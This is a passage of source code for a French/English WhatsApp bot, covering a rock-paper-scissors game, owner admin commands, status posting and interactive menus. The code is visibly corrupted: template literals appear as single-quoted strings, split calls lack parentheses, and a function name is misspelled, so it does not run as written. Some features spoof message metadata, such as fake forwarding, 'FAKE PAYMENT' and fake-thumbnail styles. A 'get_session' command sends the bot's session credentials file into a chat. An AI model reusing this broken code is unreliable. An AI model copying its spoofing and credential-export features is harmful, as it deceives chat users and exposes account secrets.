❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat'
            if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
                room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
            if (room.x !== room.o) Kev.sendText(room.x, str, m, {
                mentions: parseMention(str)
            })
            Kev.sendText(room.o, str, m, {
                mentions: parseMention(str)
            })
            if (isTie || isWin) {
                delete this.game[room.id]
            }
        }
        
        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    Kev.sendTextWithMentions(m.chat, '@${roof.p2.split'@'[0]} rejected the suit, the suit is canceled', m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    Kev.sendText(m.chat, 'Suit has been sent to chat

@${roof.p.split'@'[0]} and 
@${roof.p2.split'@'[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split'@'[0]}', m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) Kev.sendText(roof.p, 'Please Select \n\Rock🗿\nPaper📄\nScissors✂️', m)
	    if (!roof.pilih2) Kev.sendText(roof.p2, 'Please Select \n\nRock🗿\nPaper📄\nScissors✂️', m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) Kev.sendText(m.chat, 'Both Players Don't Want To Play,\nSuit Canceled')
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    Kev.sendTextWithMentions(m.chat, '@${(roof.pilih ? roof.p2 : roof.p).split'@'[0]} Didn't Choose Suit, Game Over!', m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /scissors/i
	    let b = /rock/i
	    let k = /paper/i
	    let reg = /^(scissors|rock|paper)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    replygckev('You have chosen ${m.text} ${!roof.pilih2 ? '\n\nWaiting for the opponent to choose' : ''}')
	    if (!roof.pilih2) Kev.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    replygckev('You have chosen ${m.text} ${!roof.pilih ? '\n\nWaiting for the opponent to choose' : ''}')
	    if (!roof.pilih) Kev.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    Kev.sendText(roof.asal, '_*Suit Results*_${tie ? '\nSERIES' : ''}

@${roof.p.split'@'[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ' Win \n' : ' Lost \n'}
@${roof.p2.split'@'[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ' Win \n' : ' Lost  \n'}
'.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    } //fin
	
        
        //base de donnees des utilisateurs 
        if (isCommand && !isUser) {
kevverifieduser.push(sender)
fs.writeFileSync('./recherche/donnees/role/utilisateur.json', JSON.stringify(kevverifieduser, null, 2))
}
        
        switch (isCommand) {
        	case 'reseau_social': 
        case 'socialmedia': 
        case 'update':{
	const slides = [
    [
        'https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png', // Image URL
        '', // Titre
        'Veuillez suivre la chane youtube du dev pour tout savoir sur les recentes mises a jour', // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://youtube.com/@Kenvofc', // Command (URL in this case)
        'cta_url', // Button type
        'https://youtube.com/@Kenvofc' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Telegram_2019_Logo.svg/1024px-Telegram_2019_Logo.svg.png', // Image URL
        '', // Title
        'Veuillez rejoindre le groupe telegram du dev pour discuter sur les am�liorations et donner vos points de vue', // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://t.me/+1e2AuejQBkxmNDg8', // Command (URL in this case)
        'cta_url', // Button type
        'https://t.me/+1e2AuejQBkxmNDg8' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/GitHub_Invertocat_Logo.svg/360px-GitHub_Invertocat_Logo.svg.png', // Image URL
        '', // Title
        'Veuillez suivre le GitHub du dev', // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://github.com/kenvofc', // Command (URL in this case)
        'cta_url', // Button type
        'https://github.com/kenvofc' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/264px-Instagram_logo_2016.svg.png', // Image URL
        '', // Title
        'Veuillez suivre le dev qur insta', // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://www.instagram.com/kenv8070', // Command (URL in this case)
        'cta_url', // Button type
        'https://www.instagram.com/kenv8070' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1024px-WhatsApp.svg.png', // Image URL
        '', // Title
        'Contact whatsApp du dev', // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://Wa.me/237656774511', // Command (URL in this case)
        'cta_url', // Button type
        'https://Wa.me/237656774511' // URL (used in image generation)
    ], 
];

const sendSlide = async (jid, title, message, footer, slides) => {
    const cards = slides.map(async slide => {
        const [
            image,
            titMess,
            boMessage,
            fooMess,
            textCommand,
            command,
            buttonType,
            url,
        ] = slide;
        let buttonParamsJson = {};
        switch (buttonType) {
            case "cta_url":
                buttonParamsJson = {
                    display_text: textCommand,
                    url: url,
                    merchant_url: url,
                };
                break;
            case "cta_appel":
                buttonParamsJson = { display_text: textCommand, id: command };
                break;
            case "cta_copie":
                buttonParamsJson = {
                    display_text: textCommand,
                    id: "",
                    copy_code: command,
                };
                break;
            case "cta_reminder":
            case "cta_cancel_reminder":
            case "address_message":
                buttonParamsJson = { display_text: textCommand, id: command };
                break;
            case "send_localisation":
                buttonParamsJson = {};
                break;
             case "reponse_rapide":
             buttonParamsJson = { display_text: textCommand, id: command };
             break;
            default:
                break;
        }
        const buttonParamsJsonString = JSON.stringify(buttonParamsJson);
        return {
            body: proto.Message.InteractiveMessage.Body.fromObject({
                text: boMessage,
            }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({
                text: fooMess,
            }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: titMess,
                hasMediaAttachment: true,
                ...(await prepareWAMessageMedia(
                    { image: { url: image } },
                    { upload: Kev.waUploadToServer },
                )),
            }),
            nativeFlowMessage:
                proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [
                        {
                            name: buttonType,
                            buttonParamsJson: buttonParamsJsonString,
                        },
                    ],
                }),
        };
    });
    
    const msg = generateWAMessageFromContent(
        jid,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.fromObject({
                            text: message,
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.fromObject({
                            text: footer,
                        }),
                        header: proto.Message.InteractiveMessage.Header.fromObject({
                            title: title,
                            subtitle: title,
                            hasMediaAttachment: false,
                        }),
                        carouselMessage:
                            proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                cards: await Promise.all(cards),
                            }),
                            contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
                    }),
                },
            },
        },
        { quoted: m},
    );
    await Kev.relayMessage(jid, msg.message, {
        messageId: msg.key.id,
    });
};
// Call the function with example parameters
sendSlide(m.chat, 'removed you', ownername, botname, slides);
}
break
            case 'add_grosmot': case 'addbd':
               if (!KevTheCreator) return KevStickOwner()
               if (!groupAdmins) return replygckev(mess.admin)
               if (args.length < 1) return replygckev( 'Veuillez entrer la commande ${prefix}add_grosmot [harsh word]. Exemple ${prefix}add_grosmot maaf')
               bad.push(q)
               fs.writeFileSync('./recherche/donnees/fonction/gros_mot.json', JSON.stringify(bad))
               replygckev('Gros mot add avec succes!')
            break
            case 'supp_grosmot': case 'deldb':
               if (!KevTheCreator) return KevStickOwner()
               if (!groupAdmins) return replygckev(mess.admin)
               if (args.length < 1) return replygckev( 'Veuillez entrer la commande ${prefix}supp_grosmot [bad word]. Exemple ${prefix}supp_grosmot maaf')                 
               bad.splice(q)
               fs.writeFileSync('./recherche/donnees/fonction/gros_mot.json', JSON.stringify(bad))
               replygckev('Gros mot add avec succes !')
            break 
            case 'reset_user':
            case 'resetdbuser': {
               if (!KevTheCreator) return KevStickOwner()
               let totalusernya = db.data.users[0]
               replygckev('Succesfully Deleted ${totalusernya} Users in Database')
               db.data.users = []
            }
            break
            case 'reset_hit':
            case 'reset_totalhit': {
               if (!KevTheCreator) return KevStickOwner()
               global.db.data.settings[botNumber].totalhit = 0
               replygckev(mess.done)
            }
            break
            case 'mod_menu': {
            if (!KevTheCreator) return KevStickOwner()
            if (text.startsWith('c')) {
                  typemenu = text
                  replygckev(mess.done)
               } else {
               let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton suivant'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER LE MENU🗂️",
"sections":[{"title":"VEUILLEZ SELECTIONNER LE MENU DESIREY",
"highlight_label":"PREFEREY DU PROPRIO",
"rows":[{"header":"BOUTON + CHAINE C2",
"title":"SELECTION",
"description":"BOUTON + CHAINE C2",
"id":"${prefix+command} c12"},
{"header":"BOUTON + CHAINE",
"title":"SELECTION ",
"description":"BOUTON + CHAINE",
"id":"${prefix+command} c11"},
{"header":"BOUTON UNIQUEMENT",
"title":"SELECTION ",
"description":"BOUTON UNIQUEMENT",
"id":"${prefix+command} c10"},
{"header":"CHAINE + FAKE THUMBNAIL C2",
"title":"SELECTION ",
"description":"CHAINE + FAKE THUMBNAIL C2",
"id":"${prefix+command} c9"},
{"header":"CHAINE + FAKE THUMBNAIL",
"title":"SELECTION ",
"description":"CHAINE + FAKE THUMBNAIL",
"id":"${prefix+command} c8"},
{"header":"FAKE THUMBNAIL + DOCUMENT",
"title":"SELECTION ",
"description":"FAKE THUMBNAIL + DOCUMENT",
"id":"${prefix+command} c7"},
{"header":"FAKE PAYMENT",
"title":"SELECTION ",
"description":"FAKE PAYMENT",
"id":"${prefix+command} c6"},
{"header":"CALL SCHEDULE",
"title":"SELECTION",
"description":"CALL SCHEDULE",
"id":"${prefix+command} c5"},
{"header":"GIF THUMBNAIL",
"title":"SELECTION",
"description":"GIF THUMBNAIL",
"id":"${prefix+command} c4"},
{"header":"VIDEO THUMBNAIL",
"title":"SELECTION",
"description":"VIDEO THUMBNAIL",
"id":"${prefix+command} c3"},
{"header":"CHAINE + THUMBNAIL",
"title":"SELECTION",
"description":"CHAINE + THUMBNAIL",
"id":"${prefix+command} c2"},
{"header":"IMAGE THUMBNAIL",
"title":"SELECTION",
"description":"IMAGE THUMBNAIL",
"id":"${prefix+command} c1"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
            case 'mod_reponse':{
               if (!KevTheCreator) return KevStickOwner()
               if (text.startsWith('c')) {
                  typereply = text
                  replygckev(mess.done)
               } else {
                  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton suivant'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER LE STYLE DE REPONSE 🐛",
"sections":[{"title":"VEUILLEZ SELECTIONNER LE STYLE DE REPONSE DESIREY",
"highlight_label":"PREFEREY DU PROPRIO",
"rows":[{"header":"CHAINE + LIEN THUMB",
"title":"SELECTION ",
"description":"CHAINE + LIEN THUMB",
"id":"${prefix+command} c4"},
{"header":"LONG LIEN + THUMBNAIL",
"title":"SELECTION ",
"description":"LONG LIEN+ THUMBNAIL",
"id":"${prefix+command} c3"},
{"header":"LIEN + FAKE THUMBNAIL",
"title":"SELECTION ",
"description":"LIEN + FAKE THUMBNAIL",
"id":"${prefix+command} c2"},
{"header":"NORMAL",
"title":"SELECTION ",
"description":"NORMAL",
"id":"${prefix+command} c1"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'statut_text': 
            case 'upswtext':
            case 'upswteks': {
               if (!KevTheCreator) return KevStickOwner()
               if (!q) return replygckev('Text?')
               await Kev.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.data.users) })
               replygckev(mess.done)
            }
            break
            case 'statut_video':
            case 'upswvideo': {
               if (!KevTheCreator) return KevStickOwner()
               if (/video/.test(mime)) {
                  var videosw = await Kev.downloadAndSaveMediaMessage(quoted)
                  await Kev.sendMessage('status@broadcast', {
                     video: {
                        url: videosw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users) })
                  await replygckev(mess.done)
               } else {
                  replygckev('Veuillez repondre a une video')
               }
            }
            break
            case 'statut_img':
            case 'statut_image':
            case 'upswimg': {
               if (!KevTheCreator) return KevStickOwner()
               if (/image/.test(mime)) {
                  var imagesw = await Kev.downloadAndSaveMediaMessage(quoted)
                  await Kev.sendMessage('status@broadcast', {
                     image: {
                        url: imagesw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users)})
                  await replygckev(mess.done)
               } else {
                  replygckev('Veuillez repondre a une image')
               }
            }
            break
            case 'statut_audio':
            case 'upswaudio': {
               if (!KevTheCreator) return KevStickOwner()
               if (/audio/.test(mime)) {
                  var audiosw = await Kev.downloadAndSaveMediaMessage(quoted)
                  await Kev.sendMessage('status@broadcast', {
                     audio: {
                        url: audiosw
                     },
                     mimetype: 'audio/mp4',
                     ptt: true
                  }, {
                     backgroundColor: '#FF000000',
                     statusJidList: Object.keys(global.db.data.users)
                  })
                  await replygckev(mess.done)
               } else {
                  replygckev('Veuillez repondre a un audio')
               }
            }
            break
            case 'mod_imgmenu':
            case 'sim': {
                if (!KevTheCreator) return KevStickOwner()
                let delb = await Kev.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './KenvFile/theme/sylvers.jpg')
                fs.unlinkSync(delb)
                replygckev(mess.done)
            }
            break
            case 'mod_vidmenu':
            case 'svm': 
            	case 'mod_gifmenu':
            case 'sgm': {
                if (!KevTheCreator) return KevStickOwner()
                let delb = await Kev.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './KenvFile/theme/Sylvers.mp4')
                fs.unlinkSync(delb)
                replygckenv(mess.done)
            }
            break
            case 'add_titre':{
               if (!KevTheCreator) return KevStickOwner()
               if (!text) return replygckev('Usage ${prefix + command} numero|titre')
               nonya = text.split('|')[0]
               titlenya = text.split('|')[1]
               let oo = '${nonya}@s.whatsapp.net'
               db.data.users[oo].title = titlenya
               await replygckev(mess.done)
            }
            break
            case 'supp_titre':{
               if (!KevTheCreator) return KevStickOwner()
               if (!text) return replygckev('Usage ${prefix + command} numero')
               nonya = text.split(',')[0]
               let oo = '${nonya}@s.whatsapp.net'
               db.data.users[oo].title = ''
               await replygckev(mess.done)
            }
            break
            case 'add_limite':
            case 'givelimit':{
                if (!KevTheCreator) return KevStickOwner()
                if (!text) return replygckev('Usage ${prefix + command} numero|limite')
                usernya = text.split('|')[0]
                limitnya = text.split('|')[1]
                let oo = '${usernya}@s.whatsapp.net'
                db.data.users[oo].limit += limitnya
                replygckev(mess.done)
            }
            break
            case 'supp_limit':{
                if (!KevTheCreator) return KevStickOwner()
                if (!text) return replygckev('Usage ${prefix + command} numero|limite')
                usernya = text.split('|')[0]
                limitnya = text.split('|')[1]
                if (db.data.users[usernya + '@s.whatsapp.net'].limit < limitnya) return replygckev('Sa limite n'est plus que ${limitnya}')
                db.data.users[usernya + '@s.whatsapp.net'].limit -= limitnya
                replygckev(mess.done)
            }
            break
            case 'add_boss':
                if (!KevTheCreator) return KevStickOwner()
                if (args.length < 2)
                    return replygckev('Usage ${prefix + command} @tag temps\n${prefix + command} numero|temps\n\nExemple : ${prefix + command} @tag 30d')
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium)
                    }
                    replygckev("Boss add avec succes")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium)
                    replygckev("Boss add avec succes")
                }
            break
            case 'supp_boss':
                if (!KevTheCreator) return KevStickOwner()
                if (args.length < 1) return replygckev('Usage ${prefix + command} @tag\n${prefix + command} numero\n\nExemple : ${prefix + command} 237656774511')
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1)
                        fs.writeFileSync("./recherche/donnees/role/boss.json", JSON.stringify(premium))
                    }
                    replygckev("Suppression reussie")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1)
                    fs.writeFileSync("./recherche/donnees/role/boss.json", JSON.stringify(premium))
                    replygckev("Suppression reussie")
                }
            break
            case 'liste_boss': {
                if (!KevTheCreator) return KevStickOwner()
                let data = require('./recherche/donnees/role/boss.json')
                let txt = '*------「 LISTE DES BOSS  」------*\n\n'
                for (let x of data) {
                    txt += 'Numero : ${x.id}\n'
                    txt += 'Expire dans: ${x.expired} ms\n'
                Kev.sendMessage(m.chat, {
                    text: txt,
                    mentions: x
                }, {
                    quoted: m
                })
                }
            }
            break
case 'add_proprio':
if (!KevTheCreator) return KevStickOwner()
if (!args[0]) return replygckev('Usage ${prefix+command} numero\nExemple ${prefix+command} ${ownernumber}')
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Kev.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygckev('Veuillez entrer un numero WhatsApp valide!!!')
owner.push(bnnd)
fs.writeFileSync('./recherche/donnees/role/proprio.json', JSON.stringify(owner))
replygckev('Le numero ${bnnd} est devenu l'un des proprios!!!')
break
case 'supp_proprio':
if (!KevTheCreator) return KevStickOwner()
if (!args[0]) return replygckev('Usage ${prefix+command} numero\nExemple ${prefix+command} 237656774511')
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./recherche/donnees/role/proprio.json', JSON.stringify(owner))
replygckev('Le random ${ya} a ete supprimey de la liste des proprio!!!')
break
case 'liste_proprio': {
                let teks = '┌──⭓「 *LISTE DES PROPRIOS* 」\n│\n'
                for (let x of owner) {
                    teks += '│⭔ ${x}\n'
                }
                teks += '│\n└────────────⭓\n\n*Total : ${owner.length}*'
                replygckev(teks)
            }
            break
            case 'supp_session':
            case 'clearsession': {
                if (!KevTheCreator) return KevStickOwner()
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return replygckev('Impossible de scanner le dossier : ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = ' ${filteredArray.length} fichier junkdetectey \n\n'
                    if (filteredArray.length == 0) return replygckev(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + '. ${e}\n'
                    })
                    replygckev(teks)
                    await sleep(2000)
                    replygckev("Suppression du fichier junk...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync('./session/${file}')
                    });
                    await sleep(2000)
                    replygckev("Suppression de tout mauvais fichier reussie")
                });
            }
            break
            case 'rejoindre':
                try {
                    if (!KevTheCreator) return KevStickOwner()
                    if (!text) return replygckev('Veuillez entrer le lien du groupe!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygckev('Lien Invalide!')
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    Kev.groupAcceptInvite(result)
                    await replygckev('Effectuey')
                } catch {
                    replygckev('Integration echouee')
                }
                break
            case 'get_session':
                if (!KevTheCreator) return KevStickOwner()
                replygckev('recherche du fichier de la session encours veuillez patienter quelques instants.')
                let sesi = fs.readFileSync('./session/creds.json')
                Kev.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
            break
            case 'mon_ip':
            case 'ip_bot':
                if (!KevTheCreator) return KevStickOwner()
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        replygckev("🔎 Mon adress ip publique est:" + ip);
                    })
                })
            break
            case 'requete': case 'reportbug': {
	if (!text) return replygckev('Exemple : ${
        prefix + command
      } hi dev play command is not working')
            textt = '*| REQUEST/BUG |*'
            teks1 = '\n\n*Utilisateur* : @${
   m.sender.split("@")[0]
  }\n*Requete/Bug* : ${text}'
            teks2 = '\n\n*Hey ${pushname},Votre requete a ete transmise au dev*.\n*Veuillez patienter...*'
            for (let i of owner) {
                Kev.sendMessage(i + "@s.whatsapp.net", {
                    text: textt + teks1,
                    mentions: [m.sender],
                }, {
                    quoted: m,
                })
            }
            Kev.sendMessage(m.chat, {
                text: textt + teks2 + teks1,
                mentions: [m.sender],
            }, {
                quoted: m,
            })

        }
        break
            case 'silence':
                if (!KevTheCreator) return KevStickOwner()
                replygckev('Le reinitialisation sera complete dans quelques secondes')
                await sleep(3000)
                process.exit()
            break
            case 'lecture_auto':
                if (!KevTheCreator) return KevStickOwner()
                if (q === 'oui') {
                    db.data.settings[botNumber].autoread = true
                    replygckev('Lecture auto activee ${q}')
                } else if (q === 'non') {
                    db.data.settings[botNumber].autoread = false
                    replygckev('Lecture auto desactivee ${q}')
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'disponible':
                if (!KevTheCreator) return KevStickOwner()
                if (q === 'oui') {
                    db.data.settings[botNumber].online = true
                    replygckev('Disponibilitey activee ${q}')
                } else if (q === 'non') {
                    db.data.settings[botNumber].online = false
                    replygckev('Disponibilitey desactivee ${q}')
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'reg_ecrireauto':
                if (!KevTheCreator) return KevStickOwner()
                
                if (q === 'oui') {
                    db.data.settings[botNumber].autorecordtype = true
                    replygckev('Enregistrement_ecrire auto activey ${q}')
                } else if (q === 'non') {
                    db.data.settings[botNumber].autorecordtype = false
                    replygckev('Enregistrement_ecrire auto desactivey ${q}')
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
